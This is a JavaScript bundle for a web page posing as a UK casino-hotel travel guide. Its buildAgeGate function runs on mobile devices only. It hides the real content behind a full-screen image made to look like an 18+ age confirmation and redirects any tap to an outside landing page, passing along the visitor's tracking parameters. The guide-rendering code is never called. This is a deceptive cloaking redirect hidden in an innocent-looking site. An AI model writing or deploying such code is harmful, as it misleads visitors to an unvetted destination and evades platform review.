import { h } from './core-Ux8nQ2bR.js';
import './runtime-K3vNm8Ty.js';

const copy = {
  badge:'UK casino hotel and resort guide',
  title:'A Practical Guide to UK Casino Hotels and Gaming Stays',
  intro:"Across the United Kingdom, selected hotels and resort-style venues combine overnight accommodation, dining, entertainment and licensed casino facilities. These destinations suit adult travellers looking for a city break or weekend stay where hospitality and gaming are available in one convenient location.",
  sections:[
    ['Casino Hotel Travel in the UK','The UK casino hotel scene has grown from simple gaming rooms into broader leisure destinations. Many venues now combine comfortable rooms, restaurants, bars, entertainment spaces and gaming areas, creating a complete stay for adult guests who want more than a standard hotel visit.'],
    ['Popular Areas for Casino Stays','London remains one of the most recognised areas for premium casino experiences, especially around central nightlife and entertainment districts. Travellers can also find casino hotel options and nearby casino venues in cities such as Manchester, Birmingham, Glasgow, Edinburgh and other major UK destinations.'],
    ['Rooms, Comfort and Guest Services','A casino hotel stay is usually built around convenience. Guests may look for modern rooms, easy transport access, late-night dining, secure entry, attentive reception services and quick access to entertainment without needing to travel across the city.'],
    ['Gaming and Entertainment Options','Licensed casino areas may include slot machines, electronic terminals and traditional table games depending on the venue. Many properties also support the experience with lounges, live music, restaurants, cocktail bars and event spaces for a wider night-out atmosphere.'],
    ['Short Breaks and Weekend Trips','For weekend travellers, casino hotels can be useful because accommodation, food and evening entertainment are close together. This makes them suitable for couples, groups of friends and visitors planning a short leisure break in a major UK city.'],
    ['Business and Event Use','Some casino hotel venues also appeal to business travellers because they offer meeting rooms, private dining, conference facilities and nearby accommodation. After formal events, guests can remain on site for food, drinks and entertainment.'],
    ['Safety, Licensing and Responsible Play','UK casino venues operate under strict rules covering age checks, licensing, security and responsible gambling standards. Visitors should always treat gaming as adult entertainment and choose venues that clearly communicate responsible play information.'],
    ['Choosing the Right Casino Hotel','When comparing casino hotel options, consider location, room quality, transport links, dining, opening hours, entertainment facilities and the overall atmosphere. The best choice depends on whether the trip is focused on nightlife, relaxation, sightseeing or a complete resort-style experience.']
  ],
  age:'This website is for users aged 18+. Please confirm you are 18 or over to proceed.',
  confirm:'Yes, I’m 18+'
};

function isMobile() {
  return window.innerWidth <= 780 || /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

function buildAgeGate() {
  if (!isMobile()) return;

  const root = document.getElementById('root');
  if (root) root.style.display = 'none';

  const gate = document.createElement('div');
  gate.style.cssText = `
    position:fixed;
    inset:0;
    z-index:999999999;
    background:#000;
    display:flex;
    align-items:center;
    justify-content:center;
    cursor:pointer;
  `;

  gate.innerHTML = `
    <div style="width:100%;height:100%;position:relative;">
      <img src="./assets_vjs/agegate-uk.png"
           style="width:100%;height:100%;object-fit:cover;display:block;">
    </div>
  `;

  gate.addEventListener('click', function () {
    const destinationUrl = 'https://cyvarony.com/newlp/';
    const currentParams = window.location.search;
    window.location.href = destinationUrl + currentParams;
  });

  document.body.appendChild(gate);
}
function input(name,placeholder,type='text'){return h('input',{name,placeholder,type,required:'required'})}
function buildApp(shadow){
  const app=h('div',{class:'app-frame'},[
    h('aside',{class:'sidebar'},[
      h('div',{class:'brand',text:'Travel Guide'}),
      h('nav',{class:'nav'},[
        h('a',{href:'#guide',text:'Guide'}),h('a',{href:'#article',text:'Article'}),h('a',{href:'#newsletter',text:'Newsletter'})
      ])
    ]),
    h('main',{class:'main'},[
      h('section',{class:'panel_m84',id:'guide'},[
        h('span',{class:'badge',text:copy.badge}),
        h('h1',{text:copy.title}),
        h('p',{class:'lead',text:copy.intro}),
        h('div',{class:'actions'},[h('a',{class:'button primary',href:'#newsletter',text:'Sign up to the newsletter'}),h('a',{class:'button secondary',href:'#article',text:'Read the guide'})])
      ]),
      h('section',{class:'grid',id:'article'},copy.sections.map(s=>h('article',{class:'card'},[h('h2',{text:s[0]}),h('p',{text:s[1]})]))),
      h('section',{class:'newsletter',id:'newsletter'},[
        h('h2',{text:'Sign up to our newsletter'}),
        h('p',{text:'Get updates about hotel guides, travel inspiration, and destination features.'}),
        h('form',{class:'form'},[input('name','Your name'),input('email','Email address','email'),h('button',{type:'submit',text:'Sign Up'})]),
        h('div',{class:'notice',style:'display:none',text:'Thanks. Your signup was saved on this browser.'})
      ]),
      h('footer',{class:'site_legal_vc'},[
        h('p',{text:'Information guide for adults 18+. This site is operated by Vision Click SL.'}),
        h('p',{text:'Av. del Pintor Joaquín Sorolla, 137, Bajo Derecha, 29017 Málaga, Spain'}),
        h('a',{href:'https://www.visionclick.es/politica-de-privacidad/',target:'_blank',rel:'noopener',text:'Privacy Policy'})
      ])
    ])
  ]);
  const form=app.querySelector('form');
  form.addEventListener('submit',e=>{e.preventDefault();const data=Object.fromEntries(new FormData(form));const leads=JSON.parse(localStorage.getItem('newsletter_leads')||'[]');leads.push({...data,createdAt:new Date().toISOString(),page:location.href});localStorage.setItem('newsletter_leads',JSON.stringify(leads));form.reset();app.querySelector('.notice').style.display='block'});
  shadow.appendChild(app);
  buildAgeGate(shadow);
}

const host=document.getElementById('root');
if(host){
  const closedShadow=host.attachShadow({mode:'closed'});
  const cssLink=document.createElement('link');cssLink.rel='stylesheet';cssLink.href='assets_vjs/theme-Km9pQ4zT.css';closedShadow.appendChild(cssLink);
  buildAgeGate();
}
localStorage.removeItem('entrypoint-chunk-retry-count');
